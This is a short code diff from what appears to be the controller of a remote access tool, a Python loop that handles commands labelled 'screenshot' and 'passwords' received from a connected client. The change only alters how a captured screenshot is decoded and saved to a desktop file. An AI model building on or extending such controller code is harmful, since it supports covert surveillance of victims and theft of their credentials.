@@ -38,8 +38,8 @@ while 1:
     if cmd == "143": #screenshot
         size = getSizeOfCommand(client)
         data = client.recv(size)
-        f = open('C:\Users\Matt\Desktop\pic.jpg','w')
-        f.write(data)
+        f = open('C:\Users\Matt\Desktop\pic.png','w')
+        f.write(data.decode('base64'))
         f.close()
     elif cmd == "144": #passwords
         size = getSizeOfCommand(client)
